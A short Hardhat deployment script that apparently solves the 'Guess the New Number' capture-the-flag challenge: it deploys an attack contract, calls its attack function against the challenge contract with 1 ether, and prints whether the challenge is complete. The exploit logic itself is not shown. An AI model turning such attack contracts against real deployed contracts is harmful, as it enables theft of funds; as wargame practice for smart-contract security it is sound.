const { ethers } = require("hardhat");

async function main() {
  const newNumberContract = await ethers.getContractAt(
    "GuessTheNewNumberChallenge",
    "0xc0d87BCC8fFB0096535B5A1DbB81eFAB4CdB577E"
  );

  const attackFactory = await ethers.getContractFactory(
    "AttackNewNumberChallenge"
  );

  const attackContract = await attackFactory.deploy();

  await attackContract.deployed();

  await attackContract
    .attack(newNumberContract.address, {
      value: ethers.utils.parseEther("1"),
    })
    .then((tx) => tx.wait());

  console.log("isComplete:", await newNumberContract.isComplete());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
